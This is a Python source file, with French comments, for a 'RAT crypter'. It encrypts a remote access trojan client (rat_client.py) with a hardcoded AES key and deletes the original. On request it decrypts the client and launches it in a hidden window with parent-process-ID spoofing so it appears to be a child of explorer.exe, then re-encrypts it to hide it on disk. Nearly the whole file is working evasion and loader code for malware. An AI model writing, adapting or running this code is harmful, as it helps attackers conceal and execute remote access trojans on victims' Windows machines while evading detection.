import os
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import subprocess
import sys
import time
import ctypes
import os
from ctypes import wintypes
import locale


key = b"0123456789abcdef"
iv = b"abcdef9876543210"

def pad(data: bytes) -> bytes:
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)

def unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    return data[:-pad_len]

def chiffrer_fichier(source_file="rat_client.py", output_file="rat_client.enc"):
    if not os.path.exists(source_file):
        print("[-] Fichier source introuvable :", source_file)
        return

    try:
        with open(source_file, "rb") as f:
            contenu = f.read()

        contenu_padde = pad(contenu)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        chiffré = encryptor.update(contenu_padde) + encryptor.finalize()

        with open(output_file, "wb") as f:
            f.write(base64.b64encode(chiffré))

        os.remove(source_file)
        print(f"[+] Fichier chiffré sauvegardé : {output_file}")
        print(f"[+] Fichier original supprimé : {source_file}")

    except Exception as e:
        print("[-] Erreur lors du chiffrement :", e)

def decrypter_fichier(isRun= False) -> bytes:
    fichier_chiffre="rat_client.enc"
    if not os.path.exists(fichier_chiffre):
        print("[-] Fichier chiffré introuvable :", fichier_chiffre)
        return b""

    try:
        with open(fichier_chiffre, "rb") as f:
            data = base64.b64decode(f.read())

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypte = decryptor.update(data) + decryptor.finalize()

        text= unpad(decrypte)

        with open("rat_client.py", "wb") as f:
                f.write(text)
        os.remove("rat_client.enc")
        return text


    except Exception as e:
        print("[-] Erreur lors du déchiffrement :", e)
        return b""
    

kernel32 = ctypes.windll.kernel32

CREATE_NO_WINDOW = 0x08000000
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]
    
# Structures Windows nécessaires
class STARTUPINFOEX(ctypes.Structure):
    _fields_ = [
        ("StartupInfo", STARTUPINFO),  # référence ta structure définie au-dessus
        ("lpAttributeList", ctypes.c_void_p),
    ]
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.wintypes.HANDLE),
        ("hThread", ctypes.wintypes.HANDLE),
        ("dwProcessId", ctypes.wintypes.DWORD),
        ("dwThreadId", ctypes.wintypes.DWORD),
    ]

def get_pid_by_name(process_name):
    encoding = locale.getpreferredencoding()
    try:
        tasks = subprocess.check_output("tasklist", shell=True).decode(encoding)
        for line in tasks.splitlines():
            if process_name.lower() in line.lower():
                return int(line.split()[1])  # PID est dans la 2e colonne
    except Exception as e:
        print("[-] Erreur lors de la récupération du PID :", e)
    return None


def launch_with_ppid_spoofing(target_script, parent_name="explorer.exe"):
    ppid = get_pid_by_name(parent_name)
    if not ppid:
        print(f"[-] Impossible de trouver {parent_name}")
        return

    print(f"[+] PPID ciblé : {ppid}")

    size = ctypes.c_size_t(0)

    # 1) Demande de taille
    kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))

    # 2) Allocation mémoire
    attribute_list = ctypes.create_string_buffer(size.value)

    # 3) Initialisation de la liste
    if not kernel32.InitializeProcThreadAttributeList(attribute_list, 1, 0, ctypes.byref(size)):
        print("[-] Échec de InitializeProcThreadAttributeList")
        return

    # 4) Préparation du STARTUPINFOEX
    startupinfo = STARTUPINFOEX()
    startupinfo.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
    startupinfo.lpAttributeList = ctypes.cast(attribute_list, ctypes.c_void_p)

    # 5) Ouverture du handle du parent
    p_handle = kernel32.OpenProcess(0x001F0FFF, False, ppid)
    if not p_handle:
        print("[-] Impossible d'ouvrir handle du parent.")
        return

    # 6) Mise à jour de la liste d'attributs
    handle = ctypes.c_void_p(p_handle)
    if not kernel32.UpdateProcThreadAttribute(
        attribute_list,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        ctypes.byref(handle),
        ctypes.sizeof(handle),
        None,
        None
    ):
        print("[-] Échec de UpdateProcThreadAttribute")
        kernel32.CloseHandle(p_handle)
        return

    # 7) Création du processus
    pi = PROCESS_INFORMATION()
    command = f'"{sys.executable}" --autorun "{target_script}"'

    success = kernel32.CreateProcessW(
        None,
        ctypes.create_unicode_buffer(command),
        None,
        None,
        False,
        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        None,
        None,
        ctypes.byref(startupinfo),
        ctypes.byref(pi)
    )

    if success:
        print(f"[+] Processus lancé avec PPID spoofé. PID: {pi.dwProcessId}")
    else:
        err_code = kernel32.GetLastError()
        print(f"[-] Échec de CreateProcessW, code d'erreur : {err_code}")

    # Nettoyage
    kernel32.DeleteProcThreadAttributeList(attribute_list)
    kernel32.CloseHandle(p_handle)


def executer_et_rechiffrer():
    print("[*] Déchiffrement...")
    code = decrypter_fichier()  # J'enlève le isRun=True qui n'est pas dans ta version

    if not code:
        print("[-] Échec du déchiffrement.")
        return

    abs_path = os.path.abspath("rat_client.py")
    print(f"[*] Exécution de rat_client.py en arrière-plan : {abs_path}")

    launch_with_ppid_spoofing(abs_path)
    time.sleep(5)
    print("[*] Rechiffrement après exécution (immédiat, processus lancé en background)")
    chiffrer_fichier(source_file=abs_path)


def menu():
    while True:
        print("\n=== MENU RAT CRYPTER (cryptography) ===")
        print("1. 🔐 Chiffrer un fichier .py")
        print("2. 🔓 Exécuter le code déchiffré")
        print("3. 📝 déchiffré")
        print("4. ❌ Quitter")
        choix = input("> Choix : ")

        if choix == "1":
            chiffrer_fichier()
        elif choix == "2":
             executer_et_rechiffrer()
        elif choix == "3":
            decrypter_fichier()
        elif choix == "4":
            break
        else:
            print("[-] Choix invalide.")

if __name__ == "__main__":
    menu()
